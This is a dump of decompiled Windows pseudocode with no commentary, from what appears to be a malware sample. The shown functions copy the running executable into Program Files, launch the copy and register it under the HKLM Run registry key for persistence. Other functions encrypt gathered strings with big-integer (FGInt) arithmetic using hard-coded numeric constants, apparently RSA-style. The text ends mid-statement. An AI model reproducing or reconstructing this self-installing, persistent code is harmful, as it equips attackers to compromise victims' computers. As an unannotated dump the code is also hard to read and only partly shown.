  undefined4 uStack36;
  undefined *puStack32;
  undefined *puStack28;
  uint *local_c;
  uint *local_8;
  
  puStack28 = &stack0xfffffffc;
  iVar6 = 0x88;
  do {
    local_8 = (uint *)0x0;
    iVar6 = iVar6 + -1;
  } while (iVar6 != 0);
  puStack32 = &LAB_0043983a;
  uStack36 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack36;
  puStack48 = (undefined *)0x438f63;
  GetWindowsDirectoryA((LPSTR)&DAT_00442b3c,0xff);
  FUN_00404990((int *)&DAT_00442964,extraout_EDX & 0xffffff00 | (uint)DAT_00442b3c);
  FUN_00404a70((int *)&DAT_00442964,(undefined4 *)":\\Program Files");
  bVar1 = FUN_00438aa0();
  if (bVar1) {
    FUN_00404840((int *)&local_8,(int)&DAT_00439868);
  }
  else {
    FUN_00404840((int *)&local_8,(int)&DAT_00439874);
  }
  iVar6 = FUN_00404a68((int)DAT_00442964);
  uVar3 = iVar6 - 1;
  if ((DAT_00442964 == (uint *)0x0) || (puVar7 = DAT_00442964, DAT_00442964[-1] <= uVar3)) {
    uVar3 = thunk_FUN_004027b0(uVar3);
    puVar7 = extraout_EDX_00;
  }
  uVar8 = *(char *)((int)puVar7 + uVar3) == '\\';
  if ((bool)uVar8) {
    piVar9 = (int *)&DAT_00442964;
    iVar6 = FUN_00404a68((int)DAT_00442964);
    uVar8 = iVar6 - 1U == 0;
    FUN_00404cc8((int)DAT_00442964,1,iVar6 - 1U,piVar9);
  }
  FUN_00404bb4(local_8,(uint *)&DAT_00439868);
  if (((bool)uVar8) && (pcVar4 = FUN_00404d50("(x86)",(char *)DAT_00442964), pcVar4 == (char *)0x0))
  {
    FUN_00404a70((int *)&DAT_00442964,(undefined4 *)" (x86)");
  }
  FUN_00404a70((int *)&DAT_00442964,(undefined4 *)&DAT_004398a0);
  FUN_00404840((int *)&stack0xfffffff0,
               (int)
               "|||00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
              );
  piVar9 = (int *)&stack0xfffffff0;
  pcVar4 = FUN_00404d50("|||",unaff_EBX);
  FUN_00404cc8((int)unaff_EBX,1,(uint)(pcVar4 + -1),piVar9);
  if (unaff_EBX != (char *)0x0) {
    puStack48 = &DAT_004398a0;
    FUN_00404b28((int **)&DAT_00442964,3);
  }
  if (unaff_EBX == (char *)0x0) {
    FUN_00438b10((int *)&local_c);
  }
  else {
    FUN_00438b10(&local_2b0);
    FUN_00404b28((int **)&local_c,3);
  }
  uVar8 = 1;
  FUN_00402988(0,(int *)&local_2b8);
  FUN_0040883c(local_2b8,(int *)&local_2b4);
  FUN_00404bb4(local_2b4,local_c);
  if (!(bool)uVar8) {
    uVar8 = 1;
    FUN_00402988(0,(int *)&local_2c0);
    FUN_0040883c(local_2c0,(int *)&local_2bc);
    FUN_00404bb4(local_2bc,DAT_00442964);
    if (!(bool)uVar8) {
      uVar5 = FUN_00408534((undefined *)local_c);
      if ((char)uVar5 == '\0') {
        FUN_00408558(local_c);
      }
      FUN_00402988(0,(int *)&local_2c4);
      FUN_00402d24(local_160,local_2c4);
      *PTR_DAT_00441544 = 0;
      FUN_004033b4(local_160,(HANDLE)0x1);
      FUN_004027bc();
      *PTR_DAT_00441544 = 2;
      FUN_00402988(0,(int *)&local_2d0);
      FUN_00408870(local_2d0,(int *)&local_2cc);
      FUN_00404ab4((int *)&local_2c8,local_c,local_2cc);
      FUN_00402d24(local_2ac,local_2c8);
      FUN_004033d0(local_2ac,(HANDLE)0x80);
      FUN_004027bc();
      FUN_004033b4(local_2ac,(HANDLE)0x1);
      FUN_004027bc();
      while( true ) {
        FUN_00402fe8(local_160);
        cVar2 = FUN_004027bc();
        if (cVar2 != '\0') break;
        FUN_00402e88(local_160,&stack0xffffffef,1,(uint *)0x0);
        FUN_004027bc();
        FUN_00402ea8(local_2ac,&stack0xffffffef,1,(uint *)0x0);
        FUN_004027bc();
      }
      FUN_00402ec8((undefined *)local_2ac);
      FUN_004027bc();
      FUN_00402ec8((undefined *)local_160);
      FUN_004027bc();
      nShowCmd = 5;
      lpDirectory = (LPCSTR)0x0;
      lpParameters = (LPCSTR)0x0;
      FUN_00402988(0,(int *)&local_2dc);
      FUN_00408870(local_2dc,(int *)&local_2d8);
      FUN_00404ab4((int *)&local_2d4,local_c,local_2d8);
      lpFile = FUN_00404c68(local_2d4);
      uStackY76 = 0x43929c;
      ShellExecuteA((HWND)0x0,"open",lpFile,lpParameters,lpDirectory,nShowCmd);
      FUN_00437fa4();
    }
  }
  uVar3 = FUN_00438b38();
  if ((char)uVar3 == '\0') {
    FUN_004047fc((int *)&DAT_00442964,local_c);
  }
  uVar3 = FUN_00438b38();
  uVar8 = (char)uVar3 == '\x01';
  if ((bool)uVar8) {
    FUN_00438c20((int *)&local_2e0);
    FUN_00404bb4(local_2e0,(uint *)"Windows XP");
    if (!(bool)uVar8) {
      FUN_00404bb4(local_8,(uint *)&DAT_00439874);
      if ((bool)uVar8) {
        uVar5 = *in_FS_OFFSET;
        *in_FS_OFFSET = &stack0xffffffc4;
        piVar9 = FUN_0043477c((int *)&DAT_004346b0,'\x01',extraout_ECX);
        FUN_00434858((int)piVar9,(HKEY)0x80000002);
        *(undefined *)(piVar9 + 3) = 0;
        FUN_0043499c((int)piVar9,(int)"software\\microsoft\\windows\\currentversion\\run",'\0');
        FUN_00402988(0,(int *)&local_2ec);
        FUN_00408870(local_2ec,(int *)&local_2e8);
        FUN_00404ab4((int *)&local_2e4,DAT_00442964,local_2e8);
        FUN_00434ac0((int)piVar9,&DAT_004399e0,local_2e4);
        FUN_00434828((int)piVar9);
        FUN_00403b24(piVar9);
        *in_FS_OFFSET = uVar5;
      }
      else {
        uVar5 = *in_FS_OFFSET;
        *in_FS_OFFSET = &stack0xffffffc4;
        piVar9 = FUN_004347c0((int *)&DAT_004346b0,'\x01',0x20106);
        FUN_00434858((int)piVar9,(HKEY)0x80000002);
        *(undefined *)(piVar9 + 3) = 0;
        FUN_0043499c((int)piVar9,(int)"software\\microsoft\\windows\\currentversion\\run",'\0');
        FUN_00402988(0,(int *)&local_2f8);
        FUN_00408870(local_2f8,(int *)&local_2f4);
        FUN_00404ab4((int *)&local_2f0,DAT_00442964,local_2f4);
        FUN_00434ac0((int)piVar9,&DAT_004399e0,local_2f0);
        FUN_00434828((int)piVar9);
        FUN_00403b24(piVar9);
        *in_FS_OFFSET = uVar5;
      }
    }
  }
  uVar8 = 1;
  FUN_00402988(0,(int *)&local_418);
  FUN_0040883c(local_418,(int *)&local_414);
  FUN_00407e10(local_414,(byte **)local_410);
  FUN_00407e10((byte *)DAT_00442964,(byte **)&local_41c);
  FUN_00404bb4(local_410[0],local_41c);
  if (!(bool)uVar8) {
    uVar5 = FUN_00408534((undefined *)DAT_00442964);
    if ((char)uVar5 == '\0') {
      FUN_00408558(DAT_00442964);
    }
    FUN_00402988(0,(int *)&local_420);
    FUN_00402d24(local_160,local_420);
    *PTR_DAT_00441544 = 0;
    FUN_004033b4(local_160,(HANDLE)0x1);
    FUN_004027bc();
    *PTR_DAT_00441544 = 2;
    FUN_00402988(0,(int *)&local_42c);
    FUN_00408870(local_42c,(int *)&local_428);
    FUN_00404ab4((int *)&local_424,DAT_00442964,local_428);
    FUN_00402d24(local_2ac,local_424);
    FUN_004033d0(local_2ac,(HANDLE)0x80);
    FUN_004027bc();
    FUN_004033b4(local_2ac,(HANDLE)0x1);
    FUN_004027bc();
    while( true ) {
      FUN_00402fe8(local_160);
      cVar2 = FUN_004027bc();
      uVar8 = cVar2 == '\0';
      if (!(bool)uVar8) break;
      FUN_00402e88(local_160,&stack0xffffffef,1,(uint *)0x0);
      FUN_004027bc();
      FUN_00402ea8(local_2ac,&stack0xffffffef,1,(uint *)0x0);
      FUN_004027bc();
    }
    FUN_00402ec8((undefined *)local_2ac);
    FUN_004027bc();
    FUN_00402ec8((undefined *)local_160);
    FUN_004027bc();
  }
  FUN_00404bb4(local_8,(uint *)&DAT_00439874);
  if ((bool)uVar8) {
    uVar5 = *in_FS_OFFSET;
    *in_FS_OFFSET = &stack0xffffffc4;
    piVar9 = FUN_0043477c((int *)&DAT_004346b0,'\x01',extraout_ECX_00);
    FUN_00434858((int)piVar9,(HKEY)0x80000002);
    *(undefined *)(piVar9 + 3) = 0;
    FUN_0043499c((int)piVar9,(int)"software\\microsoft\\windows\\currentversion\\run",'\0');
    FUN_00402988(0,(int *)&local_438);
    FUN_00408870(local_438,(int *)&local_434);
    FUN_00404ab4((int *)&local_430,DAT_00442964,local_434);
    FUN_00434ac0((int)piVar9,&DAT_004399e0,local_430);
    FUN_00434828((int)piVar9);
    FUN_00403b24(piVar9);
    *in_FS_OFFSET = uVar5;
  }
  else {
    uVar5 = *in_FS_OFFSET;
    *in_FS_OFFSET = &stack0xffffffc4;
    piVar9 = FUN_004347c0((int *)&DAT_004346b0,'\x01',0x20106);
    FUN_00434858((int)piVar9,(HKEY)0x80000002);
    *(undefined *)(piVar9 + 3) = 0;
    FUN_0043499c((int)piVar9,(int)"software\\microsoft\\windows\\currentversion\\run",'\0');
    FUN_00402988(0,(int *)&local_444);
    FUN_00408870(local_444,(int *)&local_440);
    FUN_00404ab4((int *)&local_43c,DAT_00442964,local_440);
    FUN_00434ac0((int)piVar9,&DAT_004399e0,local_43c);
    FUN_00434828((int)piVar9);
    FUN_00403b24(piVar9);
    *in_FS_OFFSET = uVar5;
  }
  *in_FS_OFFSET = puStack48;
  FUN_004047cc((int *)&local_444,0x11);
  FUN_004047cc(local_300,0x15);
  FUN_004047cc((int *)&stack0xfffffff0,3);
  return;
}



void FUN_004399f8(uint param_1,uint param_2,undefined4 param_3,int **param_4,uint param_5,
                 uint param_6)

{
  int iVar1;
  uint uVar2;
  int *unaff_EBX;
  int iVar3;
  undefined4 *unaff_ESI;
  int *unaff_EDI;
  int **in_FS_OFFSET;
  undefined4 *local_4c;
  int *local_48;
  int *local_44;
  undefined4 *local_40;
  int *local_3c;
  int *local_38;
  undefined4 *local_34;
  int *local_30;
  int *local_2c;
  undefined4 *local_28;
  int *local_24;
  int *local_14;
  uint local_10;
  uint local_c;
  uint local_8;
  
  local_14 = (int *)&DAT_00000008;
  do {
    local_14 = (int *)((int)local_14 + -1);
  } while (local_14 != (int *)0x0);
  local_10 = 0;
  local_24 = (int *)0x439a23;
  local_c = param_2;
  local_8 = param_1;
  FUN_00404c58(param_1);
  local_24 = (int *)0x439a2b;
  FUN_00404c58(local_c);
  local_24 = (int *)0x439a33;
  FUN_00404c58(local_10);
  local_24 = (int *)0x439a3b;
  FUN_00404c58(param_6);
  local_24 = (int *)0x439a43;
  FUN_00404c58(param_5);
  local_28 = (undefined4 *)&LAB_00439f51;
  local_2c = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_2c;
  local_30 = (int *)0x439a58;
  local_24 = (int *)&stack0xfffffffc;
  FUN_004047a8((int *)param_4);
  local_30 = (int *)0x439a60;
  iVar1 = FUN_00404a68(local_8);
  if (0 < iVar1) {
    iVar3 = 1;
    do {
      if ((local_8 == 0) || (uVar2 = local_8, *(uint *)(local_8 - 4) <= iVar3 - 1U)) {
        local_30 = (int *)0x439a81;
        uVar2 = thunk_FUN_004027b0(local_8);
      }
      if (*(byte *)((uVar2 - 1) + iVar3) < 10) {
        local_30 = *param_4;
        local_34 = (undefined4 *)&DAT_00439f6c;
        if ((local_8 == 0) || (uVar2 = local_8, *(uint *)(local_8 - 4) <= iVar3 - 1U)) {
          local_38 = (int *)0x439aa2;
          uVar2 = thunk_FUN_004027b0(local_8);
        }
        local_38 = (int *)0x439ab0;
        FUN_0040803c((uint)*(byte *)((uVar2 - 1) + iVar3),(int *)&local_14);
        local_2c = local_14;
        local_3c = (int *)0x439abf;
        FUN_00404b28(param_4,3);
      }
      else {
        if ((local_8 == 0) || (uVar2 = local_8, *(uint *)(local_8 - 4) <= iVar3 - 1U)) {
          local_30 = (int *)0x439ad3;
          uVar2 = thunk_FUN_004027b0(local_8);
        }
        if (*(byte *)((uVar2 - 1) + iVar3) < 100) {
          local_30 = *param_4;
          local_34 = (undefined4 *)&DAT_00439f78;
          if ((local_8 == 0) || (uVar2 = local_8, *(uint *)(local_8 - 4) <= iVar3 - 1U)) {
            local_38 = (int *)0x439af4;
            uVar2 = thunk_FUN_004027b0(local_8);
          }
          local_38 = (int *)0x439b02;
          FUN_0040803c((uint)*(byte *)((uVar2 - 1) + iVar3),(int *)&stack0xffffffe8);
          local_2c = unaff_EBX;
          local_3c = (int *)0x439b11;
          unaff_EBX = local_2c;
          FUN_00404b28(param_4,3);
        }
        else {
          if ((local_8 == 0) || (uVar2 = local_8, *(uint *)(local_8 - 4) <= iVar3 - 1U)) {
            local_30 = (int *)0x439b25;
            uVar2 = thunk_FUN_004027b0(local_8);
          }
          local_30 = (int *)0x439b33;
          FUN_0040803c((uint)*(byte *)((uVar2 - 1) + iVar3),(int *)&stack0xffffffe4);
          local_30 = (int *)0x439b3d;
          FUN_00404a70((int *)param_4,unaff_ESI);
        }
      }
      iVar3 = iVar3 + 1;
      iVar1 = iVar1 + -1;
    } while (iVar1 != 0);
  }
  local_30 = (int *)0x439b51;
  FUN_00404a70((int *)param_4,(undefined4 *)&DAT_00439f84);
  local_30 = (int *)0x439b59;
  iVar1 = FUN_00404a68(local_c);
  if (0 < iVar1) {
    iVar3 = 1;
    do {
      if ((local_c == 0) || (uVar2 = local_c, *(uint *)(local_c - 4) <= iVar3 - 1U)) {
        local_30 = (int *)0x439b7a;
        uVar2 = thunk_FUN_004027b0(local_c);
      }
      if (*(byte *)((uVar2 - 1) + iVar3) < 10) {
        local_30 = *param_4;
        local_34 = (undefined4 *)&DAT_00439f6c;
        if ((local_c == 0) || (uVar2 = local_c, *(uint *)(local_c - 4) <= iVar3 - 1U)) {
          local_38 = (int *)0x439b9b;
          uVar2 = thunk_FUN_004027b0(local_c);
        }
        local_38 = (int *)0x439ba9;
        FUN_0040803c((uint)*(byte *)((uVar2 - 1) + iVar3),(int *)&stack0xffffffe0);
        local_2c = unaff_EDI;
        local_3c = (int *)0x439bb8;
        unaff_EDI = local_2c;
        FUN_00404b28(param_4,3);
      }
      else {
        if ((local_c == 0) || (uVar2 = local_c, *(uint *)(local_c - 4) <= iVar3 - 1U)) {
          local_30 = (int *)0x439bcc;
          uVar2 = thunk_FUN_004027b0(local_c);
        }
        if (*(byte *)((uVar2 - 1) + iVar3) < 100) {
          local_30 = *param_4;
          local_34 = (undefined4 *)&DAT_00439f78;
          if ((local_c == 0) || (uVar2 = local_c, *(uint *)(local_c - 4) <= iVar3 - 1U)) {
            local_38 = (int *)0x439bed;
            uVar2 = thunk_FUN_004027b0(local_c);
          }
          local_38 = (int *)0x439bfb;
          FUN_0040803c((uint)*(byte *)((uVar2 - 1) + iVar3),(int *)&local_24);
          local_2c = local_24;
          local_3c = (int *)0x439c0a;
          FUN_00404b28(param_4,3);
        }
        else {
          if ((local_c == 0) || (uVar2 = local_c, *(uint *)(local_c - 4) <= iVar3 - 1U)) {
            local_30 = (int *)0x439c1e;
            uVar2 = thunk_FUN_004027b0(local_c);
          }
          local_30 = (int *)0x439c2c;
          FUN_0040803c((uint)*(byte *)((uVar2 - 1) + iVar3),(int *)&local_28);
          local_30 = (int *)0x439c36;
          FUN_00404a70((int *)param_4,local_28);
        }
      }
      iVar3 = iVar3 + 1;
      iVar1 = iVar1 + -1;
    } while (iVar1 != 0);
  }
  local_30 = (int *)0x439c4a;
  FUN_00404a70((int *)param_4,(undefined4 *)&DAT_00439f84);
  local_30 = (int *)0x439c52;
  iVar1 = FUN_00404a68(local_10);
  if (0 < iVar1) {
    iVar3 = 1;
    do {
      if ((local_10 == 0) || (uVar2 = local_10, *(uint *)(local_10 - 4) <= iVar3 - 1U)) {
        local_30 = (int *)0x439c73;
        uVar2 = thunk_FUN_004027b0(local_10);
      }
      if (*(byte *)((uVar2 - 1) + iVar3) < 10) {
        local_30 = *param_4;
        local_34 = (undefined4 *)&DAT_00439f6c;
        if ((local_10 == 0) || (uVar2 = local_10, *(uint *)(local_10 - 4) <= iVar3 - 1U)) {
          local_38 = (int *)0x439c94;
          uVar2 = thunk_FUN_004027b0(local_10);
        }
        local_38 = (int *)0x439ca2;
        FUN_0040803c((uint)*(byte *)((uVar2 - 1) + iVar3),(int *)&local_2c);
        local_3c = (int *)0x439cb1;
        FUN_00404b28(param_4,3);
      }
      else {
        if ((local_10 == 0) || (uVar2 = local_10, *(uint *)(local_10 - 4) <= iVar3 - 1U)) {
          local_30 = (int *)0x439cc5;
          uVar2 = thunk_FUN_004027b0(local_10);
        }
        if (*(byte *)((uVar2 - 1) + iVar3) < 100) {
          local_30 = *param_4;
          local_34 = (undefined4 *)&DAT_00439f78;
          if ((local_10 == 0) || (uVar2 = local_10, *(uint *)(local_10 - 4) <= iVar3 - 1U)) {
            local_38 = (int *)0x439ce6;
            uVar2 = thunk_FUN_004027b0(local_10);
          }
          local_38 = (int *)0x439cf4;
          FUN_0040803c((uint)*(byte *)((uVar2 - 1) + iVar3),(int *)&local_30);
          local_2c = local_30;
          local_3c = (int *)0x439d03;
          FUN_00404b28(param_4,3);
        }
        else {
          if ((local_10 == 0) || (uVar2 = local_10, *(uint *)(local_10 - 4) <= iVar3 - 1U)) {
            local_30 = (int *)0x439d17;
            uVar2 = thunk_FUN_004027b0(local_10);
          }
          local_30 = (int *)0x439d25;
          FUN_0040803c((uint)*(byte *)((uVar2 - 1) + iVar3),(int *)&local_34);
          local_30 = (int *)0x439d2f;
          FUN_00404a70((int *)param_4,local_34);
        }
      }
      iVar3 = iVar3 + 1;
      iVar1 = iVar1 + -1;
    } while (iVar1 != 0);
  }
  local_30 = (int *)0x439d43;
  FUN_00404a70((int *)param_4,(undefined4 *)&DAT_00439f84);
  local_30 = (int *)0x439d4b;
  iVar1 = FUN_00404a68(param_6);
  if (0 < iVar1) {
    iVar3 = 1;
    do {
      if ((param_6 == 0) || (uVar2 = param_6, *(uint *)(param_6 - 4) <= iVar3 - 1U)) {
        local_30 = (int *)0x439d6c;
        uVar2 = thunk_FUN_004027b0(param_6);
      }
      if (*(byte *)((uVar2 - 1) + iVar3) < 10) {
        local_30 = *param_4;
        local_34 = (undefined4 *)&DAT_00439f6c;
        if ((param_6 == 0) || (uVar2 = param_6, *(uint *)(param_6 - 4) <= iVar3 - 1U)) {
          local_38 = (int *)0x439d8d;
          uVar2 = thunk_FUN_004027b0(param_6);
        }
        local_38 = (int *)0x439d9b;
        FUN_0040803c((uint)*(byte *)((uVar2 - 1) + iVar3),(int *)&local_38);
        local_2c = local_38;
        local_3c = (int *)0x439daa;
        FUN_00404b28(param_4,3);
      }
      else {
        if ((param_6 == 0) || (uVar2 = param_6, *(uint *)(param_6 - 4) <= iVar3 - 1U)) {
          local_30 = (int *)0x439dbe;
          uVar2 = thunk_FUN_004027b0(param_6);
        }
        if (*(byte *)((uVar2 - 1) + iVar3) < 100) {
          local_30 = *param_4;
          local_34 = (undefined4 *)&DAT_00439f78;
          if ((param_6 == 0) || (uVar2 = param_6, *(uint *)(param_6 - 4) <= iVar3 - 1U)) {
            local_38 = (int *)0x439ddf;
            uVar2 = thunk_FUN_004027b0(param_6);
          }
          local_38 = (int *)0x439ded;
          FUN_0040803c((uint)*(byte *)((uVar2 - 1) + iVar3),(int *)&local_3c);
          local_2c = local_3c;
          local_3c = (int *)0x439dfc;
          FUN_00404b28(param_4,3);
        }
        else {
          if ((param_6 == 0) || (uVar2 = param_6, *(uint *)(param_6 - 4) <= iVar3 - 1U)) {
            local_30 = (int *)0x439e10;
            uVar2 = thunk_FUN_004027b0(param_6);
          }
          local_30 = (int *)0x439e1e;
          FUN_0040803c((uint)*(byte *)((uVar2 - 1) + iVar3),(int *)&local_40);
          local_30 = (int *)0x439e28;
          FUN_00404a70((int *)param_4,local_40);
        }
      }
      iVar3 = iVar3 + 1;
      iVar1 = iVar1 + -1;
    } while (iVar1 != 0);
  }
  local_30 = (int *)0x439e3c;
  FUN_00404a70((int *)param_4,(undefined4 *)&DAT_00439f84);
  local_30 = (int *)0x439e44;
  iVar1 = FUN_00404a68(param_5);
  if (0 < iVar1) {
    iVar3 = 1;
    do {
      if ((param_5 == 0) || (uVar2 = param_5, *(uint *)(param_5 - 4) <= iVar3 - 1U)) {
        local_30 = (int *)0x439e65;
        uVar2 = thunk_FUN_004027b0(param_5);
      }
      if (*(byte *)((uVar2 - 1) + iVar3) < 10) {
        local_30 = *param_4;
        local_34 = (undefined4 *)&DAT_00439f6c;
        if ((param_5 == 0) || (uVar2 = param_5, *(uint *)(param_5 - 4) <= iVar3 - 1U)) {
          local_38 = (int *)0x439e86;
          uVar2 = thunk_FUN_004027b0(param_5);
        }
        local_38 = (int *)0x439e94;
        FUN_0040803c((uint)*(byte *)((uVar2 - 1) + iVar3),(int *)&local_44);
        local_2c = local_44;
        local_3c = (int *)0x439ea3;
        FUN_00404b28(param_4,3);
      }
      else {
        if ((param_5 == 0) || (uVar2 = param_5, *(uint *)(param_5 - 4) <= iVar3 - 1U)) {
          local_30 = (int *)0x439eb7;
          uVar2 = thunk_FUN_004027b0(param_5);
        }
        if (*(byte *)((uVar2 - 1) + iVar3) < 100) {
          local_30 = *param_4;
          local_34 = (undefined4 *)&DAT_00439f78;
          if ((param_5 == 0) || (uVar2 = param_5, *(uint *)(param_5 - 4) <= iVar3 - 1U)) {
            local_38 = (int *)0x439ed8;
            uVar2 = thunk_FUN_004027b0(param_5);
          }
          local_38 = (int *)0x439ee6;
          FUN_0040803c((uint)*(byte *)((uVar2 - 1) + iVar3),(int *)&local_48);
          local_2c = local_48;
          local_3c = (int *)0x439ef5;
          FUN_00404b28(param_4,3);
        }
        else {
          if ((param_5 == 0) || (uVar2 = param_5, *(uint *)(param_5 - 4) <= iVar3 - 1U)) {
            local_30 = (int *)0x439f09;
            uVar2 = thunk_FUN_004027b0(param_5);
          }
          local_30 = (int *)0x439f17;
          FUN_0040803c((uint)*(byte *)((uVar2 - 1) + iVar3),(int *)&local_4c);
          local_30 = (int *)0x439f21;
          FUN_00404a70((int *)param_4,local_4c);
        }
      }
      iVar3 = iVar3 + 1;
      iVar1 = iVar1 + -1;
    } while (iVar1 != 0);
  }
  *in_FS_OFFSET = local_2c;
  local_24 = (int *)&LAB_00439f58;
  local_28 = (undefined4 *)0x439f43;
  FUN_004047cc((int *)&local_4c,0x12);
  local_28 = (undefined4 *)0x439f50;
  FUN_004047cc((int *)&param_5,2);
  return;
}



void FUN_00439f88(int **param_1)

{
  char *pcVar1;
  uint uVar2;
  int iVar3;
  int *in_FS_OFFSET;
  int *piVar4;
  int *piVar5;
  undefined **ppuVar6;
  byte *in_stack_ffffffd0;
  byte *pbVar7;
  undefined **ppuVar8;
  undefined **ppuVar9;
  int local_20;
  undefined *local_1c;
  undefined *local_18;
  undefined local_c [4];
  undefined4 uStack8;
  
  iVar3 = 7;
  do {
    uStack8 = 0;
    iVar3 = iVar3 + -1;
  } while (iVar3 != 0);
  local_18 = (undefined *)0x439fa9;
  FUN_00405100((int)local_c,(int)&DAT_00415450);
  local_18 = (undefined *)0x439fb7;
  FUN_00405100((int)&stack0xffffffec,(int)&DAT_00415450);
  local_1c = &LAB_0043a2b2;
  local_20 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int)&local_20;
  local_18 = &stack0xfffffffc;
  FUN_00404ab4((int *)&local_18,(undefined4 *)"asshole",DAT_00442950);
  FUN_00404ab4((int *)&local_1c,(undefined4 *)"asshole",DAT_00442958);
  FUN_00404ab4(&local_20,(undefined4 *)"asshole",DAT_00442968);
  FUN_00404ab4((int *)&stack0xffffffdc,(undefined4 *)"asshole",DAT_0044295c);
  FUN_00404ab4((int *)&stack0xffffffd8,(undefined4 *)"asshole",DAT_00443380);
  piVar5 = (int *)&stack0xffffffd4;
  pcVar1 = FUN_00404d50(":",DAT_0044338c);
  pcVar1 = pcVar1 + 1;
  pbVar7 = (byte *)0x43a044;
  uVar2 = FUN_00404a68((int)DAT_0044338c);
  FUN_00404cc8((int)DAT_0044338c,(int)pcVar1,uVar2,piVar5);
  FUN_00415c1c(pbVar7,local_c);
  piVar5 = (int *)&stack0xffffffd0;
  pcVar1 = FUN_00404d50(":",DAT_0044338c);
  FUN_00404cc8((int)DAT_0044338c,1,(uint)(pcVar1 + -1),piVar5);
  FUN_00415c1c(in_stack_ffffffd0,&stack0xffffffec);
  ppuVar9 = &local_18;
  FUN_00418090((int)local_18,(int)local_c,&stack0xffffffec,(int *)ppuVar9);
  ppuVar8 = &local_1c;
  FUN_00418090((int)local_1c,(int)local_c,&stack0xffffffec,(int *)ppuVar8);
  FUN_00418090(local_20,(int)local_c,&stack0xffffffec,&local_20);
  FUN_00418090((int)ppuVar9,(int)local_c,&stack0xffffffec,(int *)&stack0xffffffdc);
  piVar5 = (int *)&stack0xffffffd8;
  FUN_00418090((int)ppuVar8,(int)local_c,&stack0xffffffec,piVar5);
  piVar4 = (int *)&stack0xffffffcc;
  pcVar1 = FUN_00404d50(":",DAT_00443388);
  pcVar1 = pcVar1 + 1;
  uVar2 = FUN_00404a68((int)DAT_00443388);
  FUN_00404cc8((int)DAT_00443388,(int)pcVar1,uVar2,piVar4);
  FUN_00415c1c((byte *)piVar5,local_c);
  piVar5 = (int *)&stack0xffffffc8;
  pcVar1 = FUN_00404d50(":",DAT_00443388);
  FUN_00404cc8((int)DAT_00443388,1,(uint)(pcVar1 + -1),piVar5);
  FUN_00415c1c((byte *)piVar5,&stack0xffffffec);
  FUN_00418090((int)local_18,(int)local_c,&stack0xffffffec,(int *)&local_18);
  ppuVar6 = &local_1c;
  FUN_00418090((int)local_1c,(int)local_c,&stack0xffffffec,(int *)ppuVar6);
  piVar5 = &local_20;
  FUN_00418090(local_20,(int)local_c,&stack0xffffffec,piVar5);
  FUN_00418090((int)ppuVar9,(int)local_c,&stack0xffffffec,(int *)&stack0xffffffdc);
  FUN_00418090((int)ppuVar8,(int)local_c,&stack0xffffffec,(int *)&stack0xffffffd8);
  piVar4 = (int *)&stack0xffffffc4;
  pcVar1 = FUN_00404d50(":",DAT_00443384);
  pcVar1 = pcVar1 + 1;
  uVar2 = FUN_00404a68((int)DAT_00443384);
  FUN_00404cc8((int)DAT_00443384,(int)pcVar1,uVar2,piVar4);
  FUN_00415c1c((byte *)ppuVar6,local_c);
  piVar4 = (int *)&stack0xffffffc0;
  pcVar1 = FUN_00404d50(":",DAT_00443384);
  FUN_00404cc8((int)DAT_00443384,1,(uint)(pcVar1 + -1),piVar4);
  FUN_00415c1c((byte *)piVar5,&stack0xffffffec);
  FUN_00418090((int)local_18,(int)local_c,&stack0xffffffec,(int *)&local_18);
  FUN_00418090((int)local_1c,(int)local_c,&stack0xffffffec,(int *)&local_1c);
  FUN_00418090(local_20,(int)local_c,&stack0xffffffec,&local_20);
  FUN_00418090((int)ppuVar9,(int)local_c,&stack0xffffffec,(int *)&stack0xffffffdc);
  FUN_00418090((int)ppuVar8,(int)local_c,&stack0xffffffec,(int *)&stack0xffffffd8);
  FUN_004399f8((uint)local_18,(uint)local_1c,local_20,param_1,(uint)ppuVar8,(uint)ppuVar9);
  *in_FS_OFFSET = (int)param_1;
  FUN_004047cc((int *)&stack0xffffffc0,0xb);
  FUN_0040521c((int **)&stack0xffffffec,"\x0e\x06TFGInt\b",2);
  return;
}



void entry(void)

{
  uint uVar1;
  bool bVar2;
  char *pcVar3;
  uint uVar4;
  undefined *puVar5;
  int iVar6;
  undefined4 extraout_ECX;
  uint extraout_ECX_00;
  uint extraout_ECX_01;
  uint extraout_ECX_02;
  undefined4 extraout_EDX;
  uint extraout_EDX_00;
  uint extraout_EDX_01;
  uint extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  undefined4 extraout_EDX_05;
  undefined4 *unaff_ESI;
  byte *unaff_EDI;
  uint **in_FS_OFFSET;
  undefined uVar7;
  float10 in_ST0;
  undefined *local_40;
  uint *local_3c;
  uint *local_38;
  undefined *local_34;
  uint *puVar8;
  int *piVar9;
  byte **ppbVar10;
  uint *puVar11;
  uint *local_28;
  int *local_24;
  byte *local_20;
  
  iVar6 = 7;
  do {
    iVar6 = iVar6 + -1;
  } while (iVar6 != 0);
  local_20 = (byte *)0x43a4cd;
  FUN_00406844(&DAT_0043a3c8);
  local_24 = (int *)&LAB_0043ad19;
  local_28 = *in_FS_OFFSET;
  *in_FS_OFFSET = (uint *)&local_28;
  local_20 = &stack0xfffffffc;
  FUN_004047fc((int *)&DAT_00443380,
               (undefined4 *)
               "Johnmen{}{}{}BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
              );
  piVar9 = (int *)&DAT_00443380;
  pcVar3 = FUN_00404d50("{}{}{}",DAT_00443380);
  FUN_00404cc8((int)DAT_00443380,1,(uint)(pcVar3 + -1),piVar9);
  FUN_004047fc((int *)&DAT_00443384,
               (undefined4 *)
               "82185735584238685767632861624177274887293565538741444362435583850820132920183142699990513211431218351515869551667585525921751268860153332622085268097015158687030691773886056780852269841267506558244411"
              );
  FUN_00404a70((int *)&DAT_00443384,
               (undefined4 *)
               "03484117901192362044107373706299647832760503989379610949620903289961076922047235709569442148351776390771045819406380727053579573045429371687056037657759416374532634792426441798055715624726414878656648"
              );
  FUN_00404a70((int *)&DAT_00443384,
               (undefined4 *)
